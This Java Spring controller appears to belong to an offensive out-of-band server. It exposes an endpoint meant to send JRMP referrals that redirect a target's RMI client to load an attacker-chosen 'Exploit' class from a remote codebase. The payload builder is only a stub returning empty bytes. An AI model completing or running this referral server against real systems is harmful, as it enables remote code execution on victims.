package com.oobx.controller;

import com.oobx.rebind.RebindStore;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

/**
 * Generates JRMP referral response bytes for RMI rebind.
 * Called by the Python RMI listener when it needs to send a rebind payload to a target.
 */
@RestController
@RequestMapping("/rmi")
public class RmiController {

    private final RebindStore rebindStore;

    public RmiController(RebindStore rebindStore) {
        this.rebindStore = rebindStore;
    }

    @GetMapping("/referral")
    public ResponseEntity<byte[]> referral(
            @RequestParam String token,
            @RequestParam String codebase) {
        RebindStore.Entry entry = rebindStore.get(token);
        String className = entry != null ? entry.className() : "Exploit";

        // Build a minimal JRMP ReturnData / ExceptionalReturn blob that
        // redirects the client to codebase + className.
        // In production this uses marshalsec's JRMPListener output.
        byte[] referralBytes = buildJrmpReferral(codebase, className);
        return ResponseEntity.ok()
                .header("Content-Type", "application/octet-stream")
                .body(referralBytes);
    }

    private byte[] buildJrmpReferral(String codebase, String className) {
        // Minimal JRMP handshake + ReferenceWrapper referral.
        // Real implementation delegates to marshalsec or a hand-crafted JRMP frame.
        // Placeholder — replace with marshalsec JRMPListener logic.
        try {
            // If marshalsec is on classpath:
            // Class<?> gen = Class.forName("marshalsec.jndi.RMIRefServer");
            // ... invoke to get bytes
            return new byte[0];
        } catch (Exception e) {
            return new byte[0];
        }
    }
}
